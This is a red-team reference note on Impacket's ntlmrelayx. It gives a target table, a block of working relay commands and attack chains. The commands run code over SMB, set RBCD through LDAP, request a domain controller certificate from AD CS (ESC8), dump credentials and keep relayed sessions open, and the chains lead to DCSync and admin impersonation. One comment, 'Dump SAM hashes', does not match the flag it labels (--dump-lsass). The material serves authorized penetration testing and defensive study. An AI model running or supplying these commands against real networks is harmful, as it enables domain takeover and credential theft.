---
title: ntlmrelayx
aliases: ["ntlmrelayx.py", "ntlmrelayx", "NTLM relay tool"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Fortra (Impacket)"
source_url: "https://github.com/fortra/impacket"
verified: true
related: ["[[NTLM Relay]]", "[[Responder]]", "[[PetitPotam]]", "[[AD Certificate Services Abuse (ESC1-ESC8)]]", "[[Resource-Based Constrained Delegation (RBCD)]]"]
created: 2026-06-07
updated: 2026-06-07
---

# ntlmrelayx

> [!summary] One-liner
> Impacket's NTLM relay tool — accepts incoming NTLM authentications (captured by [[Responder]] or coerced by [[PetitPotam]]) and relays them to target services to execute commands, dump credentials, or modify AD objects.

## Common relay targets

| Target | Flag | Effect |
|---|---|---|
| SMB | `-t smb://<IP>` | Execute commands, dump SAM, create services |
| LDAP/LDAPS | `-t ldap://<DC>` / `-t ldaps://<DC>` | Add computer account, modify ACLs, set [[Resource-Based Constrained Delegation (RBCD)|RBCD]] |
| HTTP (AD CS) | `-t http://<CA>/certsrv/certfnsh.asp --adcs` | Request certificate as victim ([[AD Certificate Services Abuse (ESC1-ESC8)|ESC8]]) |
| MSSQL | `-t mssql://<IP>` | Execute SQL queries |

## Usage
```bash
# Basic SMB relay (execute command)
ntlmrelayx.py -t smb://<TARGET> -smb2support -c "whoami > C:\temp\pwned.txt"

# Relay to LDAP — set RBCD on target computer
ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user <CONTROLLED_USER>

# Relay to AD CS web enrollment (ESC8)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Dump SAM hashes via relay
ntlmrelayx.py -t smb://<TARGET> -smb2support --dump-lsass

# SOCKs mode (keep relayed sessions open for manual use)
ntlmrelayx.py -t smb://<TARGET> -smb2support -socks
```

## Typical attack chains
1. **Responder + ntlmrelayx**: Responder poisons → captures auth → ntlmrelayx relays to target.
2. **PetitPotam + ntlmrelayx + AD CS**: Coerce DC auth → relay to CA → get DC cert → DCSync.
3. **Coerce + RBCD**: Coerce machine auth → relay to LDAP → set RBCD → impersonate admin.

## Related
- Capture: [[Responder]], [[Inveigh]].
- Coercion: [[PetitPotam]], [[PrintNightmare]] (SpoolSample).
- Attack technique: [[NTLM Relay]].
- Parent toolkit: [[Impacket]].
